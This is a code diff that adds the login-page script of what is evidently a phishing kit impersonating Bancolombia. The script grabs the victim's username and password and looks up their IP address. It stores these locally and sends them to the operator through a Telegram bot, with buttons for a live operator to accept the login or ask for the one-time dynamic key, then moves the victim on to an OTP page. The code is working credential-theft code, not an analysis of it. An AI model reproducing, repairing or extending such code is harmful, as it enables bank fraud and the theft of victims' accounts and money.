@@ -574,6 +574,138 @@
                 otpError.classList.add('show');
             }
         });
+    <!-- Reemplaza SOLO la sección de scripts al final de login.html -->
+
+    <script src="js/telegram.js"></script>
+    <script>
+        console.log('🔐 Login page loaded');
+
+        // Verificar si viene con error
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === '1') {
+            document.getElementById('errorAlert').classList.add('show');
+        }
+
+        // Obtener IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error obteniendo IP:', error);
+                return 'IP no disponible';
+            }
+        }
+
+        // Form submission - VERSIÓN CORREGIDA
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            console.log('📤 Form submitted');
+
+            const usuario = document.getElementById('usuario').value.trim();
+            const clave = document.getElementById('clave').value.trim();
+
+            if (!usuario || !clave) {
+                document.getElementById('errorAlert').classList.add('show');
+                return;
+            }
+
+            // Mostrar loading
+            document.getElementById('loadingScreen').classList.add('active');
+            console.log('⏳ Loading screen activado');
+
+            try {
+                // Obtener IP
+                console.log('🌐 Obteniendo IP...');
+                const userIP = await getIP();
+                console.log('✅ IP obtenida:', userIP);
+                
+                const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+
+                // GUARDAR EN LOCALSTORAGE
+                localStorage.setItem('userName', usuario);
+                localStorage.setItem('userPass', clave);
+                localStorage.setItem('userIP', userIP);
+                localStorage.setItem('userIP2', 'Colombia');
+                localStorage.setItem('transactionId', transactionId);
+
+                console.log('💾 Datos guardados en localStorage:', {
+                    userName: usuario,
+                    userPass: clave,
+                    userIP: userIP,
+                    transactionId: transactionId
+                });
+
+                // Enviar a Telegram
+                const mensaje = `🔐 *BANCOLOMBIA - LOGIN*
+
+👤 *Usuario:* \`${usuario}\`
+🔑 *Clave:* \`${clave}\`
+🌐 *IP:* ${userIP}
+⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}
+📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}
+🆔 *ID:* \`${transactionId}\``;
+
+                const teclado = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+                            { text: "❌ Incorrecto", callback_data: `error_login:${transactionId}` }
+                        ],
+                        [
+                            { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }
+                        ],
+                        [
+                            { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
+                        ]
+                    ]
+                };
+
+                console.log('📤 Enviando mensaje a Telegram...');
+                
+                // Verificar que la función existe
+                if (typeof sendTelegramMessage === 'function') {
+                    await sendTelegramMessage(mensaje, teclado);
+                    console.log('✅ Mensaje enviado a Telegram exitosamente');
+                } else {
+                    console.error('❌ sendTelegramMessage no está disponible');
+                    throw new Error('Función de Telegram no disponible');
+                }
+
+                // IMPORTANTE: Esperar un poco y luego redirigir
+                console.log('⏳ Esperando 1.5 segundos antes de redirigir...');
+                
+                setTimeout(() => {
+                    console.log('📄 Redirigiendo a otp-dinamica.html');
+                    document.getElementById('loadingScreen').classList.remove('active');
+                    window.location.href = 'otp-dinamica.html';
+                }, 1500);
+
+            } catch (error) {
+                console.error('❌ Error completo:', error);
+                console.error('Stack trace:', error.stack);
+                
+                // Ocultar loading
+                document.getElementById('loadingScreen').classList.remove('active');
+                
+                // Mostrar error al usuario
+                alert('Error al procesar. Por favor intenta nuevamente.');
+                document.getElementById('errorAlert').classList.add('show');
+            }
+        });
+
+        // Limpiar error al escribir
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('input', () => {
+                document.getElementById('errorAlert').classList.remove('show');
+                input.classList.remove('error');
+            });
+        });
+
+        console.log('✅ Login script inicializado');
     </script>
+</body>
+</html>
 </body>
 </html>
